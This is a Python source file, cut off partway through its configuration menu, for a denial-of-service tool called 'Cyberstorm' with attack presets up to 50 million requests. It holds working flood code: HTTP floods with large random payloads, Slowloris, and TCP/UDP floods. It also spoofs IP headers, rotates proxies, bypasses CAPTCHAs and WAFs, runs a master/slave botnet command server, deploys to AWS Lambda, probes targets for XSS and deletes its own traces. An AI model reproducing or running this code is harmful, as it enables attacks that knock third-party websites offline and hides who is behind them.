#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bảo 2025 - All Rights Reserved

import asyncio
import aiohttp
import cloudscraper
import time
import urllib.parse
import os
import random
import hashlib
import json
import csv
from datetime import datetime
import socket
import ssl
import whois
import dns.resolver
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.text import Text
from rich import print as rprint
from fake_useragent import UserAgent
import psutil
import plotly.graph_objects as go
import plotly.io as pio
import socketserver
import threading
from prompt_toolkit import PromptSession
from prompt_toolkit.styles import Style
from prompt_toolkit.key_binding import KeyBindings
from sklearn.linear_model import LogisticRegression
import numpy as np
import schedule
import boto3
import google.cloud.functions_v1

# Initialize rich console with theme
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "red bold",
    "success": "green bold",
    "highlight": "bright_magenta",
})
console = Console(theme=custom_theme)

# Initialize fake User-Agent
ua = UserAgent()

# Prompt_toolkit setup
style = Style.from_dict({
    'prompt': 'cyan bold',
    'error': 'red bold',
    'success': 'green bold',
})
bindings = KeyBindings()
@bindings.add('c-c')
def _(event):
    event.app.exit(exception=KeyboardInterrupt)
prompt_session = PromptSession(style=style, key_bindings=bindings)

# ASCII art animation
def animate_ascii_art(art, duration=2):
    lines = art.strip().split("\n")
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("[info]Loading Cyberstorm...[/]", total=len(lines))
        for line in lines:
            console.print(Text(line, style=random.choice(["success", "info", "warning"])))
            progress.advance(task, advance=1)
            time.sleep(duration / len(lines))

# ASCII art variants
ASCII_ARTS = {
    "cyberstorm": """
    ╔═════════════════════════════╗
    ║ 💥 CYBERSTORM 2025 💥      ║
    ║ ⚡️ QUANG BẢO - HACKER ⚡️ ║
    ╚═════════════════════════════╝
    ║ 🔫 0101 TARGET LOCKED 1010 ║
    ║ 🛡️ UNLEASH THE STORM 🛡️  ║
    ╚═════════════════════════════╝
    """,
    "megastorm": """
    ╔═════════════════════════════╗
    ║ 🌩️ MEGASTORM 2025 🌩️     ║
    ║ ⚡️ QUANG BẢO - HACKER ⚡️ ║
    ╚═════════════════════════════╝
    ║ 💣 TARGET IN SIGHT 💣      ║
    ║ 🛡️ CRUSH THE DEFENSE 🛡️  ║
    ╚═════════════════════════════╝
    """,
    "ultrastorm": """
    ╔═════════════════════════════╗
    ║ ⚡ ULTRASTORM 2025 ⚡      ║
    ║ ⚡️ QUANG BẢO - HACKER ⚡️ ║
    ╚═════════════════════════════╝
    ║ 🔫 LOCK AND LOAD 🔫        ║
    ║ 🛡️ OBLITERATE TARGET 🛡️  ║
    ╚═════════════════════════════╝
    """,
    "hyperstorm": """
    ╔═════════════════════════════╗
    ║ 🔥 HYPERSTORM 2025 🔥     ║
    ║ ⚡️ QUANG BẢO - HACKER ⚡️ ║
    ╚═════════════════════════════╝
    ║ 💥 MAXIMUM IMPACT 💥      ║
    ║ 🛡️ DESTROY ALL 🛡️       ║
    ╚═════════════════════════════╝
    """,
    "superstorm": """
    ╔═════════════════════════════╗
    ║ 🌌 SUPERSTORM 2025 🌌     ║
    ║ ⚡️ QUANG BẢO - HACKER ⚡️ ║
    ╚═════════════════════════════╝
    ║ 🔫 SUPREME POWER 🔫       ║
    ║ 🛡️ ANNIHILATE TARGET 🛡️  ║
    ╚═════════════════════════════╝
    """,
    "godstorm": """
    ╔═════════════════════════════╗
    ║ ⚔️ GODSTORM 2025 ⚔️      ║
    ║ ⚡️ QUANG BẢO - HACKER ⚡️ ║
    ╚═════════════════════════════╝
    ║ 💥 DIVINE WRATH 💥        ║
    ║ 🛡️ ERASE ALL DEFENSES 🛡️ ║
    ╚═════════════════════════════╝
    """
}

# Language support
LANGUAGES = {
    "vi": {
        "menu_title": "MENU CHIẾN LƯỢC TẤN CÔNG",
        "config_title": "TÙY CHỈNH TẤN CÔNG",
        "target_locked": "Mục tiêu đã khóa: {}",
        "invalid_url": "URL không hợp lệ: {}",
        "empty_url": "URL không được để trống! Thử lại.",
        "invalid_choice": "Lựa chọn không hợp lệ! Thử lại.",
        "attack_warning": "Tấn công {} sẽ gửi {} request! Chuẩn bị hệ thống!",
        "stop_instruction": "Để dừng: Nhấn Ctrl+C hoặc 'killall python3' (Linux/Termux)",
        "confirm_attack": "Xác nhận tấn công",
        "attack_canceled": "Hủy tấn công",
        "assessing_security": "Đang đánh giá mức độ bảo mật...",
        "attack_starting": "Khởi động tấn công {}...",
        "attack_completed": "Tấn công {} hoàn tất với {} luồng!",
        "attack_stopped": "Tấn công {} bị dừng",
        "error": "LỖI: {}",
        "security_assessment": "Đánh giá bảo mật: {}, Threads: {}, Requests: {}",
        "proxy_fetch_failed": "Không thể lấy proxy. Dùng cấu hình cục bộ.",
        "trace_cleaned": "Đã xóa dấu vết: {}",
        "trace_clean_failed": "Không thể xóa dấu vết.",
        "subdomains_found": "Tìm thấy {} subdomains: {}",
        "vulnerabilities_found": "Tìm thấy {} lỗ hổng: {}",
        "distributed_mode": "Chế độ phân tán: Gửi lệnh đến {} slaves",
        "schedule_set": "Đã đặt lịch tấn công: {}",
        "cloud_deployed": "Đã triển khai trên {}: {}",
    },
    "en": {
        "menu_title": "ATTACK STRATEGY MENU",
        "config_title": "ATTACK CONFIGURATION",
        "target_locked": "Target locked: {}",
        "invalid_url": "Invalid URL: {}",
        "empty_url": "URL cannot be empty! Try again.",
        "invalid_choice": "Invalid choice! Try again.",
        "attack_warning": "Attack {} will send {} requests! Prepare system!",
        "stop_instruction": "To stop: Press Ctrl+C or 'killall python3' (Linux/Termux)",
        "confirm_attack": "Confirm attack",
        "attack_canceled": "Attack canceled",
        "assessing_security": "Assessing target security level...",
        "attack_starting": "Starting attack {}...",
        "attack_completed": "Attack {} completed with {} threads!",
        "attack_stopped": "Attack {} stopped",
        "error": "ERROR: {}",
        "security_assessment": "Security assessment: {}, Threads: {}, Requests: {}",
        "proxy_fetch_failed": "Failed to fetch proxies. Using local configuration.",
        "trace_cleaned": "Cleaned trace: {}",
        "trace_clean_failed": "Failed to clean traces.",
        "subdomains_found": "Found {} subdomains: {}",
        "vulnerabilities_found": "Found {} vulnerabilities: {}",
        "distributed_mode": "Distributed mode: Sending commands to {} slaves",
        "schedule_set": "Attack scheduled: {}",
        "cloud_deployed": "Deployed on {}: {}",
    }
}

# File integrity check
EXPECTED_HASH = None

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[warning][SYSTEM] Generated new hash: {file_hash}[/]")
            elif file_hash != EXPECTED_HASH:
                console.print("[error][CRITICAL ERROR] File tampered! Exiting.[/]")
                exit(1)
    except Exception as e:
        console.print(f"[error][CRITICAL ERROR] Integrity check failed: {str(e)}[/]")
        exit(1)

# Clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Target selection effect
def target_selection_effect(target_type, lang):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]LOCKING TARGET: {target_type.upper()}[/]", total=100)
        for i in range(0, 101, 25):
            progress.update(task, advance=25, description=f"[info]LOCKING TARGET: {target_type.upper()} [{i}%]...[/]")
            time.sleep(0.3)
        progress.update(task, description=f"[success]TARGET LOCKED: {target_type.upper()} [100%]![/]")

# Loading animation
def loading_animation(message, duration):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]{message}[/]", total=100)
        for i in range(0, 101, 25):
            progress.update(task, advance=25, description=f"[info]{message} [{i}%]...[/]")
            time.sleep(duration / 4)
        progress.update(task, description=f"[success]{message} [100%]![/]")

# Random headers for WAF and CAPTCHA bypass
def generate_random_headers(url):
    headers = {
        'User-Agent': ua.random,
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'identity']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com', url]),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': random.choice(['1', '0']),
        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'Origin': url,
        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'same-origin', 'cors']),
        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'iframe']),
        'Sec-CH-UA': f'"Chromium";v="{random.randint(90, 120)}", "Not)A;Brand";v="{random.randint(1, 99)}"',
        'Sec-CH-UA-Mobile': random.choice(['?0', '?1']),
        'Sec-CH-UA-Platform': random.choice(['Windows', 'Linux', 'Android', 'macOS']),
        'Viewport-Width': str(random.randint(800, 1920)),
        'Viewport-Height': str(random.randint(600, 1080)),
    }
    return headers

# Fetch and validate proxy list
async def fetch_proxies():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all") as response:
                proxies = (await response.text()).splitlines()
                valid_proxies = []
                for proxy in proxies:
                    if proxy:
                        try:
                            async with session.get("https://httpbin.org/ip", proxy=f"http://{proxy}", timeout=5) as resp:
                                if resp.status == 200:
                                    valid_proxies.append({"http": f"http://{proxy}"})
                        except:
                            continue
                return valid_proxies
    except:
        console.print("[warning][SYSTEM] Failed to fetch proxies. Using local configuration.[/]")
        return []

# Proxy list for rotation
PROXY_LIST = []

# Random POST data
POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
    "attack_vector": random.choice(["destroy", "obliterate", "annihilate"]),
    "mouse_event": random.choice(["click", "mousemove", "mousedown", "mouseup"]),
    "keyboard_event": random.choice(["keydown", "keypress", "keyup"]),
    "viewport_size": f"{random.randint(800, 1920)}x{random.randint(600, 1080)}"
}

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
status_codes = {}
subdomains = []
vulnerabilities = []

# AI-based attack adjustment
class AIAttackOptimizer:
    def __init__(self):
        self.model = LogisticRegression()
        self.training_data = []
        self.training_labels = []

    def add_response(self, status_code, response_time, threads, requests):
        self.training_data.append([status_code, response_time, threads, requests])
        label = 1 if status_code == 500 else (0 if status_code in (403, 429) else 2)
        self.training_labels.append(label)

    def train(self):
        if len(self.training_data) > 10:
            self.model.fit(self.training_data, self.training_labels)

    def predict_adjustment(self, status_code, response_time, current_threads, current_requests):
        if len(self.training_data) <= 10:
            return current_threads, current_requests
        prediction = self.model.predict([[status_code, response_time, current_threads, current_requests]])[0]
        if prediction == 1:  # Server weak (500)
            return current_threads * 1.5, current_requests * 2
        elif prediction == 0:  # Rate limited (403/429)
            return current_threads * 0.5, current_requests * 0.5
        return current_threads, current_requests

ai_optimizer = AIAttackOptimizer()

# Validate URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("Invalid URL")
        return url
    except Exception as e:
        raise ValueError(f"Invalid URL: {e}")

# Save attack configuration
def save_attack_config(url, num_threads, requests_per_thread, target_type):
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "target_type": target_type,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open("cyberstorm_attack.json", "w") as f:
            json.dump(config, f)
        console.print(f"[warning][SYSTEM] Attack configuration saved: {url}[/]")
    except Exception as e:
        console.print(f"[error][ERROR] Failed to save attack configuration: {str(e)}[/]")

# Load user configuration
def load_user_config():
    try:
        with open("user_config.json", "r") as f:
            return json.load(f)
    except:
        return {
            "threads": 1000,
            "requests_per_thread": 1000,
            "stealth_mode": False,
            "clean_after": False,
            "slowloris_mode": False,
            "slowloris_connections": 100,
            "scan_subdomains": False,
            "scan_vulnerabilities": False,
            "distributed_mode": False,
            "schedule": None
        }

# Save user configuration
def save_user_config(config):
    try:
        with open("user_config.json", "w") as f:
            json.dump(config, f)
        console.print("[info][SYSTEM] User configuration saved.[/]")
    except Exception as e:
        console.print(f"[error][ERROR] Failed to save user configuration: {str(e)}[/]")

# Clean up traces
def clean_traces():
    try:
        for file in ["cyberstorm_attack.json", "user_config.json", "schedule.json"] + [f for f in os.listdir() if f.startswith("attack_report_") or f.startswith("attack_log_") or f.endswith(".html")]:
            os.remove(file)
            console.print(f"[info][SYSTEM] Cleaned trace: {file}[/]")
    except:
        console.print("[warning][SYSTEM] Failed to clean traces.[/]")

# Scan subdomains
def scan_subdomains(domain):
    common_subdomains = ["www", "api", "mail", "ftp", "admin", "test", "dev", "staging"]
    found_subdomains = []
    resolver = dns.resolver.Resolver()
    for subdomain in common_subdomains:
        try:
            full_domain = f"{subdomain}.{domain}"
            answers = resolver.resolve(full_domain, "A")
            for answer in answers:
                found_subdomains.append(f"http://{full_domain}")
        except:
            continue
    return found_subdomains

# Scan vulnerabilities
def scan_vulnerabilities(url):
    found_vulnerabilities = []
    try:
        scraper = cloudscraper.create_scraper()
        response = scraper.get(url, headers=generate_random_headers(url), timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', '')
            inputs = form.find_all('input')
            for input_tag in inputs:
                if input_tag.get('name') in ['username', 'password', 'search', 'query']:
                    found_vulnerabilities.append(f"Potential SQLi/XSS in form: {action}")
        test_payload = "?test=<script>alert('xss')</script>"
        response = scraper.get(url + test_payload, headers=generate_random_headers(url), timeout=5)
        if "<script>alert('xss')</script>" in response.text:
            found_vulnerabilities.append(f"Reflected XSS vulnerability: {url + test_payload}")
    except Exception as e:
        console.print(f"[warning][SYSTEM] Vulnerability scan failed: {str(e)}[/]")
    return found_vulnerabilities

# TCP/UDP flood
async def tcp_udp_flood(url, packets, attack_name, protocol="TCP"):
    domain = urllib.parse.urlparse(url).hostname
    port = 443 if url.startswith("https://") else 80
    try:
        ip = socket.gethostbyname(domain)
        packet_size = random.randint(64, 1024)
        for _ in range(packets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "TCP" else socket.SOCK_DGRAM)
                s.settimeout(2)
                if protocol == "TCP":
                    s.connect((ip, port))
                    s.send(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\n\r\n")
                else:
                    s.sendto(os.urandom(packet_size), (ip, port))
                with manager:
                    global success_count
                    success_count += 1
                console.print(f"[warning][{attack_name.upper()}] {protocol} Flood: Packet sent to {ip}:{port}[/]")
                s.close()
            except:
                with manager:
                    global error_count
                    error_count += 1
                console.print(f"[error][{attack_name.upper()}] {protocol} Flood failed[/]")
            await asyncio.sleep(random.uniform(0.01, 0.05))
    except Exception as e:
        console.print(f"[error][{attack_name.upper()}] {protocol} Flood error: {str(e)}[/]")

# Distributed attack server
class DistributedAttackHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request.recv(1024).strip().decode()
        if data.startswith("ATTACK"):
            _, url, attack_name, threads, requests_per_thread, attack_type = data.split(":")
            threads = int(threads)
            requests_per_thread = int(requests_per_thread)
            console.print(f"[info][SLAVE] Received attack command: {attack_name} on {url} with {threads} threads, {requests_per_thread} requests, type {attack_type}[/]")
            if attack_type == "HTTP":
                asyncio.run(perform_attack(url, requests_per_thread, attack_name, threads))
            elif attack_type in ("TCP", "UDP"):
                asyncio.run(tcp_udp_flood(url, requests_per_thread, attack_name, attack_type))

def start_distributed_server(port):
    server = socketserver.ThreadingTCPServer(('0.0.0.0', port), DistributedAttackHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    return server

# Send attack command to slaves
async def send_to_slaves(slaves, url, attack_name, threads, requests_per_thread, attack_type):
    for slave in slaves:
        try:
            reader, writer = await asyncio.open_connection(slave, 9999)
            command = f"ATTACK:{url}:{attack_name}:{threads}:{requests_per_thread}:{attack_type}"
            writer.write(command.encode())
            await writer.drain()
            writer.close()
            await writer.wait_closed()
            console.print(f"[info][MASTER] Sent attack command to {slave}[/]")
        except Exception as e:
            console.print(f"[error][MASTER] Failed to send command to {slave}: {str(e)}[/]")

# Slowloris attack
async def slowloris_attack(url, connections, attack_name):
    async with aiohttp.ClientSession() as session:
        for _ in range(connections):
            try:
                headers = generate_random_headers(url)
                async with session.get(url, headers=headers, timeout=5) as response:
                    await asyncio.sleep(10)
                with manager:
                    global success_count
                    success_count += 1
                console.print(f"[warning][{attack_name.upper()}] Slowloris: Connection kept open[/]")
            except:
                with manager:
                    global error_count
                    error_count += 1
                console.print(f"[error][{attack_name.upper()}] Slowloris failed[/]")
            await asyncio.sleep(random.uniform(0.1, 0.5))

# HTTP attack with CAPTCHA bypass and retry
async def perform_attack(url, requests_per_thread, attack_name, max_retries=3):
    scraper = cloudscraper.create_scraper()
    async with aiohttp.ClientSession() as session:
        methods = ["GET", "POST", "HEAD", "PUT", "PATCH"]
        try:
            response = scraper.get(url, headers=generate_random_headers(url), timeout=5)
            if response.cookies:
                console.print(f"[info][{attack_name.upper()}] Got cookies: {response.cookies}[/]")
        except:
            pass

        for _ in range(requests_per_thread):
            retries = 0
            while retries <= max_retries:
                try:
                    method = random.choice(methods)
                    headers = generate_random_headers(url)
                    headers['Connection'] = 'keep-alive'
                    headers['Keep-Alive'] = 'timeout=5, max=1000'
                    headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
                    proxy_url = proxy["http"] if proxy else None
                    payload = "X" * random.randint(524288, 1048576)
                    start_time = time.time()
                    if method == "GET":
                        async with session.get(url, headers=headers, proxy=proxy_url, timeout=2) as response:
                            status = response.status
                    elif method == "POST":
                        async with session.post(url, data=payload, headers=headers, proxy=proxy_url, timeout=2) as response:
                            status = response.status
                    elif method == "HEAD":
                        async with session.head(url, headers=headers, proxy=proxy_url, timeout=2) as response:
                            status = response.status
                    elif method == "PUT":
                        async with session.put(url, data=payload, headers=headers, proxy=proxy_url, timeout=2) as response:
                            status = response.status
                    else:  # PATCH
                        async with session.patch(url, data=payload, headers=headers, proxy=proxy_url, timeout=2) as response:
                            status = response.status
                    response_time = (time.time() - start_time) * 1000
                    with manager:
                        global success_count, error_count, response_times, status_codes
                        success_count += 1
                        response_times.append(response_time)
                        status_codes[status] = status_codes.get(status, 0) + 1
                        ai_optimizer.add_response(status, response_time, max_retries, requests_per_thread)
                    if status in (429, 403, 522):
                        console.print(f"[error][{attack_name.upper()}] Attack: Status {status} - TARGET OVERLOADED[/]")
                    else:
                        console.print(f"[warning][{attack_name.upper()}] Attack: Status {status}[/]")
                    with open(f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv", "a", newline="") as f:
                        writer = csv.writer(f)
                        writer.writerow([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), url, method, status, response_time])
                    break
                except Exception as e:
                    retries += 1
                    if retries > max_retries:
                        with manager:
                            global error_count
                            error_count += 1
                        console.print(f"[error][{attack_name.upper()}] Attack failed after {max_retries} retries: {str(e)}[/]")
                        break
                    await asyncio.sleep(random.uniform(0.1, 0.5))
            await asyncio.sleep(random.uniform(0.001, 0.01))

# Generate HTML report
def generate_html_report(target, attack_name, total_requests, success_count, error_count, total_time, avg_response_time, max_response_time, min_response_time, status_codes, subdomains, vulnerabilities):
    fig = go.Figure(data=[
        go.Bar(name='Status Codes', x=list(status_codes.keys()), y=list(status_codes.values()))
    ])
    fig.update_layout(title='Status Code Distribution', xaxis_title='Status Code', yaxis_title='Count')
    html_content = f"""
    <html>
    <head><title>Cyberstorm Attack Report</title></head>
    <body>
        <h1>Attack Report: {attack_name.upper()}</h1>
        <p><b>Target:</b> {target}</p>
        <p><b>Total Requests:</b> {total_requests:,}</p>
        <p><b>Success:</b> {success_count:,} ({success_count/total_requests*100:.1f}%)</p>
        <p><b>Failed:</b> {error_count:,} ({error_count/total_requests*100:.1f}%)</p>
        <p><b>Total Time:</b> {total_time:.2f} seconds</p>
        <p><b>Average Response Time:</b> {avg_response_time:.2f}ms</p>
        <p><b>Peak Performance:</b> {max_response_time:.2f}ms</p>
        <p><b>Minimum Latency:</b> {min_response_time:.2f}ms</p>
        <p><b>Requests per Second:</b> {total_requests/total_time:.0f}</p>
        <p><b>Subdomains Targeted:</b> {', '.join(subdomains)}</p>
        <p><b>Vulnerabilities Found:</b> {', '.join(vulnerabilities) if vulnerabilities else 'None'}</p>
        {pio.to_html(fig, full_html=False)}
    </body>
    </html>
    """
    with open(f"attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html", "w") as f:
        f.write(html_content)

# Cloud deployment (AWS Lambda/GCP Cloud Functions)
def deploy_to_cloud(platform, url, attack_name, threads, requests_per_thread):
    try:
        if platform == "AWS":
            lambda_client = boto3.client('lambda')
            lambda_function = {
                'FunctionName': f'Cyberstorm_{attack_name}',
                'Runtime': 'python3.9',
                'Role': 'arn:aws:iam::YOUR_ACCOUNT_ID:role/lambda_execution_role',
                'Handler': 'baongu.lambda_handler',
                'Code': {'ZipFile': open('baongu.py', 'rb').read()},
                'Timeout': 900,
                'Environment': {
                    'Variables': {
                        'TARGET_URL': url,
                        'ATTACK_NAME': attack_name,
                        'THREADS': str(threads),
                        'REQUESTS': str(requests_per_thread)
                    }
                }
            }
            response = lambda_client.create_function(**lambda_function)
            console.print(f"[info][{LANGUAGES[lang]['cloud_deployed'].format('AWS', response['FunctionArn'])}]")
        elif platform == "GCP":
            # Placeholder for GCP Cloud Functions (requires gcloud CLI setup)
            console.print("[warning][SYSTEM] GCP deployment not fully implemented. Configure via gcloud CLI.[/]")
    except Exception as e:
        console.print(f"[error][SYSTEM] Cloud deployment failed: {str(e)}[/]")

# Target configurations
TARGET_CONFIGS = [
    {"id": "1", "name": "cyberstorm", "threads": 5000, "requests": 1000, "desc": "HTTP Attack 5M requests, CAPTCHA bypass", "level": "Very High", "application": "Application layer attack"},
    {"id": "2", "name": "megastorm", "threads": 10000, "requests": 1000, "desc": "HTTP Attack 10M requests, CAPTCHA bypass", "level": "Extreme", "application": "Large-scale application attack"},
    {"id": "3", "name": "ultrastorm", "threads": 20000, "requests": 1000, "desc": "HTTP Attack 20M requests, CAPTCHA bypass", "level": "Ultra High", "application": "Maximum target attack"},
    {"id": "4", "name": "hyperstorm", "threads": 30000, "requests": 1000, "desc": "HTTP Attack 30M requests, CAPTCHA bypass", "level": "Super Strong", "application": "Extreme target attack"},
    {"id": "5", "name": "superstorm", "threads": 40000, "requests": 1000, "desc": "HTTP Attack 40M requests, CAPTCHA bypass", "level": "Supreme", "application": "Massive target attack"},
    {"id": "6", "name": "godstorm", "threads": 50000, "requests": 1000, "desc": "HTTP Attack 50M requests, CAPTCHA bypass", "level": "Godlike", "application": "Ultimate target attack"}
]

# Display ordered functions
def display_ordered_functions(lang):
    clear_screen()
    table = Table(title=LANGUAGES[lang]["menu_title"], style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Name", style="success")
    table.add_column("Description")
    table.add_column("Threads", justify="right")
    table.add_column("Requests", justify="right")
    table.add_column("Total Requests", justify="right")
    table.add_column("Level")
    table.add_column("Application")
    for func in sorted(TARGET_CONFIGS, key=lambda x: x['threads'] * x['requests']):
        table.add_row(
            func['id'],
            func['name'].upper(),
            func['desc'],
            f"{func['threads']:,}",
            f"{func['requests']:,}",
            f"{func['threads'] * func['requests']:,}",
            func['level'],
            func['application']
        )
    console.print(table)
    prompt_session.prompt("[info]Press Enter to return to menu...[/]")

# Display target menu
def display_target_menu(lang):
    clear_screen()
    animate_ascii_art(ASCII_ARTS["cyberstorm"])
    table = Table(title=LANGUAGES[lang]["menu_title"], style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Name", style="success")
    table.add_column("Description")
    table.add_row("0", "List", "View strategy list")
    for target in sorted(TARGET_CONFIGS, key=lambda x: int(x['id'])):
        table.add_row(target['id'], target['name'].upper(), target['desc'])
    console.print(table)

# Display configuration menu
def display_config_menu(lang):
    table = Table(title=LANGUAGES[lang]["config_title"], style="info")
    table.add_column("Option", style="highlight")
    table.add_column("Description")
    table.add_row("1", "Number of threads")
    table.add_row("2", "Requests per thread")
    table.add_row("3", "Stealth mode (Tor/Proxy)")
    table.add_row("4", "Clean traces after attack")
    table.add_row("5", "Slowloris mode")
    table.add_row("6", "Scan subdomains")
    table.add_row("7", "Scan vulnerabilities")
    table.add_row("8", "Distributed attack mode")
    table.add_row("9", "TCP/UDP flood")
    table.add_row("10", "Schedule attack")
    table.add_row("11", "Deploy to cloud")
    table.add_row("12", "Save configuration")
    console.print(table)

# Main function
async def main():
    global PROXY_LIST, subdomains, vulnerabilities
    check_file_integrity()
    user_config = load_user_config()
    stealth_mode = user_config.get("stealth_mode", False)
    clean_after = user_config.get("clean_after", False)
    slowloris_mode = user_config.get("slowloris_mode", False)
    scan_subdomains_flag = user_config.get("scan_subdomains", False)
    scan_vulnerabilities_flag = user_config.get("scan_vulnerabilities", False)
    distributed_mode = user_config.get("distributed_mode", False)
    tcp_udp_mode = False
    schedule_attack = False
    cloud_deploy = False
    slaves = []
    attack_type = "HTTP"
    SLOWLORIS_CONNECTIONS = user_config.get("slowloris_connections", 100)
    lang = await prompt_session.prompt_async("[info]Select language (vi/en): [/]", default="vi", validator=lambda x: x in ["vi", "en"])

    PROXY_LIST = await fetch_proxies()

    # Load scheduled attacks
    if user_config.get("schedule"):
        schedule.every(user_config["schedule"]["interval"]).minutes.do(
            lambda: asyncio.run(run_scheduled_attack(
                user_config["schedule"]["url"],
                user_config["schedule"]["attack_name"],
                user_config["schedule"]["threads"],
                user_config["schedule"]["requests_per_thread"],
                lang
            ))
        )
        console.print(f"[info][{LANGUAGES[lang]['schedule_set'].format(user_config['schedule']['interval'])}]")

    while True:
        try:
            display_target_menu(lang)
            choice = await prompt_session.prompt_async("[info]Enter choice (0-6): [/]")

            if choice == "0":
                display_ordered_functions(lang)
                continue

            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                console.print(f"[error][{LANGUAGES[lang]['invalid_choice']}]")
                time.sleep(1)
                continue
            clear_screen()
            animate_ascii_art(ASCII_ARTS[target['name']])
            target_selection_effect(target['name'], lang)

            input_url = await prompt_session.prompt_async("[info]Enter target URL: [/]")
            if not input_url:
                console.print(f"[error][{LANGUAGES[lang]['empty_url']}]")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
            except ValueError as e:
                console.print(f"[error][{LANGUAGES[lang]['invalid_url'].format(str(e))}]")
                time.sleep(1)
                continue

            console.print(f"[success][{LANGUAGES[lang]['target_locked'].format(validated_url)}]")

            # Custom configuration
            use_custom = (await prompt_session.prompt_async("[info]Customize attack configuration? (y/n): [/]", default="n")) == "y"
            NUM_THREADS = user_config.get("threads", target['threads'])
            REQUESTS_PER_THREAD = user_config.get("requests_per_thread", target['requests'])
            if use_custom:
                display_config_menu(lang)
                while True:
                    config_choice = await prompt_session.prompt_async("[info]Enter option (1-12, or 'x' to exit): [/]")
                    if config_choice == 'x':
                        break
                    elif config_choice == '1':
                        NUM_THREADS = int(await prompt_session.prompt_async("[info]Enter number of threads (100-100000): [/]", default=str(target['threads'])))
                        NUM_THREADS = max(100, min(NUM_THREADS, 100000))
                    elif config_choice == '2':
                        REQUESTS_PER_THREAD = int(await prompt_session.prompt_async("[info]Enter requests per thread (100-10000): [/]", default=str(target['requests'])))
                        REQUESTS_PER_THREAD = max(100, min(REQUESTS_PER_THREAD, 10000))
                    elif config_choice == '3':
                        stealth_mode = (await prompt_session.prompt_async("[info]Enable stealth mode (Tor/Proxy)? (y/n): [/]", default="n")) == "y"
                    elif config_choice == '4':
                        clean_after = (await prompt_session.prompt_async("[info]Clean traces after attack? (y/n): [/]", default="n")) == "y"
                    elif config_choice == '5':
                        slowloris_mode = (await prompt_session.prompt_async("[info]Enable Slowloris mode? (y/n): [/]", default="n")) == "y"
                        if slowloris_mode:
                            SLOWLORIS_CONNECTIONS = int(await prompt_session.prompt_async("[info]Enter number of Slowloris connections (10-1000): [/]", default="100"))
                            SLOWLORIS_CONNECTIONS = max(10, min(SLOWLORIS_CONNECTIONS, 1000))
                    elif config_choice == '6':
                        scan_subdomains_flag = (await prompt_session.prompt_async("[info]Scan subdomains? (y/n): [/]", default="n")) == "y"
                    elif config_choice == '7':
                        scan_vulnerabilities_flag = (await prompt_session.prompt_async("[info]Scan vulnerabilities? (y/n): [/]", default="n")) == "y"
                    elif config_choice == '8':
                        distributed_mode = (await prompt_session.prompt_async("[info]Enable distributed attack mode? (y/n): [/]", default="n")) == "y"
                        if distributed_mode:
                            slaves_input = await prompt_session.prompt_async("[info]Enter slave IPs (comma-separated): [/]")
                            slaves = [ip.strip() for ip in slaves_input.split(",") if ip.strip()]
                    elif config_choice == '9':
                        tcp_udp_mode = (await prompt_session.prompt_async("[info]Enable TCP/UDP flood? (y/n): [/]", default="n")) == "y"
